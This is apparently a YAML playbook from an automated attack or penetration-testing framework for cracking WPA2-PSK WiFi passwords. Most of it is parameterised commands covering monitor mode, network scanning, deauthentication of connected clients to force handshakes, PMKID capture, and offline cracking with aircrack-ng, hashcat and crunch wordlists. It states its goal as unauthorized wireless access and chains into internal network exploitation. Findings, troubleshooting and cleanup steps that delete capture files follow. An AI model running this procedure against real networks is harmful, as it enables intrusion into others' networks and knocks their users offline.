id: wpa2_psk_cracking
name: WiFi WPA2-PSK Cracking
category: Wireless Access
priority: high
description: Capture and crack WPA2 handshakes or exploit PMKID to gain wireless access.
detailed_description: |
  Capture WPA2 4-way handshakes or PMKID hashes from wireless networks and crack them offline
  to obtain the network passphrase and gain unauthorized wireless access.

required_conditions:
  - wireless_networks_present
  - wpa2_psk_in_use

optional_conditions:
  - weak_passwords_suspected
  - pmkid_vulnerable
  - clients_present

tools:
  - name: aircrack-ng
    description: Wireless security auditing suite
    platform: linux
  - name: hashcat
    description: Advanced password recovery
    platform: all
  - name: hcxdumptool
    description: PMKID capture tool
    platform: linux

phases:
  - name: preparation
    steps:
      - id: check_interface
        action: Check wireless interface capabilities
        command: iw list | grep -A 10 "Supported interface"

      - id: enable_monitor_mode
        action: Put interface in monitor mode
        command: sudo airmon-ng start {wireless_interface}
        alternatives:
          - shell: manual
            command: |
              sudo ifconfig {wireless_interface} down
              sudo iwconfig {wireless_interface} mode monitor
              sudo ifconfig {wireless_interface} up

      - id: kill_interfering
        action: Kill interfering processes
        command: sudo airmon-ng check kill

  - name: reconnaissance
    steps:
      - id: scan_networks
        action: Scan for WPA2 networks
        command: sudo airodump-ng {wireless_interface}mon
        output_variables:
          - target_bssid
          - target_channel
          - target_ssid
          - client_macs

      - id: focus_target
        action: Focus on target network
        command: sudo airodump-ng -c {target_channel} --bssid {target_bssid} -w {output_file} {wireless_interface}mon

  - name: handshake_capture
    steps:
      - id: deauth_clients
        action: Deauthenticate clients to force handshake
        command: sudo aireplay-ng -0 {deauth_count} -a {target_bssid} -c {client_mac} {wireless_interface}mon
        alternatives:
          - shell: broadcast_deauth
            command: sudo aireplay-ng -0 {deauth_count} -a {target_bssid} {wireless_interface}mon
        caution: May be detected by WIDS

      - id: verify_handshake
        action: Verify handshake captured
        command: aircrack-ng {output_file}-01.cap
        expected_output: "1 handshake"

  - name: pmkid_capture
    steps:
      - id: capture_pmkid
        action: Attempt PMKID capture (clientless)
        command: sudo hcxdumptool -i {wireless_interface}mon -o pmkid.pcapng --enable_status=1
        timeout: 300

      - id: convert_pmkid
        action: Convert PMKID for cracking
        command: hcxpcaptool -z pmkid.16800 pmkid.pcapng

  - name: cracking
    steps:
      - id: crack_aircrack
        action: Crack with aircrack-ng
        command: aircrack-ng -w {wordlist_path} -b {target_bssid} {capture_file}.cap
        alternatives:
          - shell: custom_wordlist
            command: crunch 8 12 -f /usr/share/crunch/charset.lst mixalpha-numeric | aircrack-ng -w - -b {target_bssid} {capture_file}.cap

      - id: crack_hashcat_wpa2
        action: Crack with hashcat (WPA2)
        command: |
          # Convert to hashcat format first
          hcxpcaptool -o {capture_file}.hccapx {capture_file}.cap
          hashcat -m 2500 {capture_file}.hccapx {wordlist_path}

      - id: crack_hashcat_pmkid
        action: Crack PMKID with hashcat
        command: hashcat -m 16800 pmkid.16800 {wordlist_path}

triggers:
  on_complete:
    - methodology: wireless_network_exploitation
      condition: password_cracked
    - methodology: internal_network_access
      condition: wifi_access_gained

findings:
  - id: weak_wifi_password
    title: Weak WiFi Password
    severity: high
    description: WPA2 password susceptible to dictionary attack

  - id: wps_enabled
    title: WPS Enabled on Network
    severity: medium
    description: WiFi Protected Setup provides additional attack vector

  - id: no_wireless_ids
    title: No Wireless IDS Detected
    severity: low
    description: Deauthentication attacks not detected or prevented

  - id: wpa2_not_wpa3
    title: Using WPA2 Instead of WPA3
    severity: medium
    description: Network using older, less secure protocol

issues:
  - symptom: No handshake captured
    severity: medium
    causes:
      - No clients connected
      - Clients using PMF
      - Signal too weak
    resolutions:
      - Wait for client activity
      - Try PMKID attack instead
      - Get closer to AP

  - symptom: Monitor mode fails
    severity: high
    causes:
      - Driver doesn't support
      - Virtual machine limitations
      - Wrong chipset
    resolutions:
      - Use compatible adapter
      - Boot native Linux
      - Check adapter chipset

  - symptom: Password not in wordlist
    severity: medium
    causes:
      - Complex password
      - Not dictionary based
      - Custom character set
    resolutions:
      - Use larger wordlist
      - Try rule-based attacks
      - Use rainbow tables

cleanup:
  - priority: high
    action: Stop monitor mode
    command: sudo airmon-ng stop {wireless_interface}mon

  - priority: medium
    action: Restart network manager
    command: sudo service network-manager restart

  - priority: low
    action: Remove capture files
    command: rm -f {output_file}* pmkid*

outcome_analysis:
  success_indicators:
    - Handshake captured
    - PMKID obtained
    - Password cracked
    - Network access gained

  failure_indicators:
    - No clients present
    - PMF protection enabled
    - Strong password resists cracking
    - WPA3 in use